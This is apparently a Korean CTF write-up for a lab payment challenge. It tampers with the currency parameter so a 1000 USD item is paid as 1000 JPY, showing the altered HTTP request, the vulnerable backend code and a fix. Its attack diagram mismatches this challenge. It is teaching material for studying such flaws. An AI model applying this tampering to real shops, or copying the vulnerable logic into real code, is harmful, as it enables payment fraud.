+++
title = "VulnABLE CTF [LUXORA] Write-up: Payment Manipulation 🥈 Silver"
date = "2026-03-14"
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "Payment", "Silver", "Currency Manipulation", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: Payment Manipulation 🥈 Silver

## 🎯 챌린지 개요
- **카테고리**: Logic & Business Layer (Payment Manipulation)
- **난이도**: 🥈 Silver
- **타겟 경로**: `/payment/silver`
- **목표**: 서버가 가격(Price) 자체는 DB에서 안전하게 가져오지만, 사용자가 결제 수단으로 사용하는 **통화(Currency)**를 클라이언트의 입력에 의존하는 결함을 이용하여, 매우 가치가 낮은 통화로 비싼 물건을 결제하라.

---

## 🕵️‍♂️ 1. 정보 수집 및 시스템 동작 분석 (Reconnaissance)

`/payment/silver` 에는 가격이 `1000 USD` 인 상품이 있습니다.
현재 내 잔액은 `10 USD` 와 `50000 JPY(일본 엔)` 등 다중 통화(Multi-Currency) 지갑으로 구성되어 있다고 가정합니다.

**[정상 결제 요청 패킷]**
```http
POST /payment/silver/checkout HTTP/1.1
Content-Type: application/x-www-form-urlencoded

item_id=999&currency=USD
```

**[서버의 응답]**
```text
Error: Insufficient funds. You need 1000 USD, but you only have 10 USD.
```

**[해커의 사고 과정]**
1. Bronze에서 통했던 `price=1` 조작은 더 이상 통하지 않는다. 서버가 DB에서 `1000` 이라는 값을 직접 가져온다.
2. 하지만 결제를 진행할 때, 내가 사용할 통화(`currency=USD`)를 파라미터로 선택해서 보내고 있다.
3. 서버의 로직이 만약 "DB의 가격(1000)과 내 지갑의 잔액을 비교"할 때, 통화의 가치(환율)를 제대로 환산하지 않는다면?
4. 내가 `currency=JPY` (엔화) 를 보냈을 때, 서버가 "아, 1000엔을 차감하면 되겠구나!" 라고 착각할 수 있지 않을까? (1000 JPY는 약 7 USD에 불과함)

---

## 💥 2. 취약점 식별 및 파라미터 조작 (Exploitation)

### 📊 공격 흐름도 (Attack Flow)

```text
[ Attacker ] --(Price: $1)--> [ Web Server ]
                              |-- Trusts Client Price
                              |-- Deducts $1
                              |-- Item Purchased!
```


이른바 **Currency Manipulation (통화 위변조)** 버그입니다. 다국어/다통화 지원 글로벌 이커머스에서 환율 계산 로직이 누락되거나 클라이언트를 신뢰할 때 발생합니다.

### 💡 통화 파라미터 변조
결제 요청의 `currency` 파라미터 값을 상대적으로 가치가 매우 낮은 통화 코드(예: `JPY`, `KRW`, `VND`)로 변경합니다. 내 지갑에는 50000 JPY가 있으므로 잔고는 충분합니다.

**[조작된 HTTP 패킷]**
```http
POST /payment/silver/checkout HTTP/1.1
Host: localhost:3000
Content-Type: application/x-www-form-urlencoded
Cookie: session=user_token

item_id=999&currency=JPY
```

---

## 🚀 3. 공격 수행 및 결과 확인

조작된 패킷을 서버로 전송합니다.

### 🔍 서버 내부의 동작
서버는 통화 간의 환율(Exchange Rate)을 적용하지 않고, 단순히 '숫자'만 비교하는 치명적인 논리 오류를 범합니다.

```javascript
// 취약한 백엔드 로직
const itemPrice = db.getPrice(req.body.item_id); // DB에서 1000을 가져옴
const userCurrency = req.body.currency; // "JPY"

// 내 지갑에서 JPY 잔고를 가져옴 (50000 JPY)
const userBalance = user.wallet[userCurrency];

// 환율 환산 없이 숫자(1000)만 비교함!
if (userBalance >= itemPrice) {
    user.wallet[userCurrency] -= itemPrice; // 50000 - 1000 = 49000
    deliverItem();
}
```

### 🔍 서버의 응답
내 엔화(JPY) 지갑에서 고작 1000엔(약 7달러)만 차감되고, 1000달러짜리 플래그 상품 결제가 승인되었습니다!

```html
HTTP/1.1 200 OK

<div class="success">
  <h2>Payment Successful!</h2>
  <p>You paid 1000 JPY for "Flag Premium".</p>
  <p class="flag">FLAG{PAYMENT_🥈_CURRENCY_MISMATCH_D4E5F6}</p>
</div>
```

---

## 🚩 4. 롸잇업 결론 및 플래그

가격(Price) 검증을 완벽하게 했더라도, 결제의 또 다른 핵심 축인 통화(Currency)와 환율(Exchange Rate)에 대한 검증을 누락하면 결국 가격 조작과 동일한 파괴력을 가지게 됨을 확인했습니다.

**🔥 획득한 플래그:**
`FLAG{PAYMENT_🥈_CURRENCY_MISMATCH_D4E5F6}`

### 🛡️ 취약점 원인 및 패치 방안 (Remediation)
결제 금액을 비교할 때 단위(Unit/Currency)를 통일하지 않고, 스칼라 값(순수 숫자)끼리만 비교 연산을 수행한 것이 원인입니다.

* **안전한 패치 가이드 (기준 통화 정규화)**
모든 결제 시스템은 내부적으로 **기준 통화(Base Currency, 보통 USD)** 하나로 모든 가치를 환산(Normalize)하여 계산해야 합니다.

```javascript
// 1. 상품의 Base 기준 가격 (USD)
const itemPriceUSD = 1000;

// 2. 사용자가 선택한 결제 통화 (예: JPY)
const userCurrency = req.body.currency;

// 3. 서버에 저장된 최신 환율 정보 가져오기 (클라이언트 입력 절대 신뢰 금지)
const exchangeRate = getExchangeRate("USD", userCurrency); // 예: 1 USD = 150 JPY

// 4. 결제해야 할 실제 청구 금액 계산 (1000 * 150 = 150,000 JPY)
const requiredAmount = itemPriceUSD * exchangeRate;

if (user.wallet[userCurrency] >= requiredAmount) {
    user.wallet[userCurrency] -= requiredAmount;
    // 승인
} else {
    // 50000 < 150000 이므로 잔액 부족 에러 발생!
    return res.status(400).send("Insufficient funds.");
}